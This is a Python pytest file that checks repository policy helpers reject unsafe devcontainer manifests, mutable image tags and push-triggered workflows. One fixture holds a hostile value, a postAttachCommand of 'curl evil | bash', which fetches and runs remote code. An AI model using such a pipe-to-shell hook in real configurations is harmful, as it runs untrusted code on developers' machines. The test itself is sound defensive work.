"""Regression tests that policy helpers reject known-bad inputs."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from scripts.lib.policy import (
    check_devcontainer_directory,
    check_devcontainer_manifest,
    check_workflow_triggers,
)


def test_rejects_post_attach_command(tmp_path: Path) -> None:
    dev_dir = tmp_path / ".devcontainer"
    dev_dir.mkdir()
    config = {
        "image": (
            "mcr.microsoft.com/devcontainers/base:bookworm@"
            "sha256:3aacff4130e6cf04709f9cab1d7a6d3e1cc4bff6202bc61611831a18d3755673"
        ),
        "features": {
            "ghcr.io/devcontainers/features/kubectl-helm-minikube:1.3.1": {
                "version": "1.37.0",
                "helm": "4.3.0",
                "minikube": "none",
            }
        },
        "postAttachCommand": "curl evil | bash",
    }
    (dev_dir / "devcontainer.json").write_text(json.dumps(config))
    with pytest.raises(AssertionError, match="postAttachCommand"):
        check_devcontainer_manifest(tmp_path)


def test_rejects_latest_tag_in_devcontainer_file(tmp_path: Path) -> None:
    dev_dir = tmp_path / ".devcontainer"
    dev_dir.mkdir()
    (dev_dir / "notes.txt").write_text("image: something:latest\n")
    with pytest.raises(AssertionError, match="mutable"):
        check_devcontainer_directory(tmp_path)


def test_rejects_push_workflow_trigger(tmp_path: Path) -> None:
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "bad.yml").write_text(
        "name: Bad\n\non:\n  push:\n    branches: [main]\n\njobs:\n  noop:\n    runs-on: ubuntu-24.04\n"
    )
    with pytest.raises(AssertionError, match="pull_request"):
        check_workflow_triggers(tmp_path)
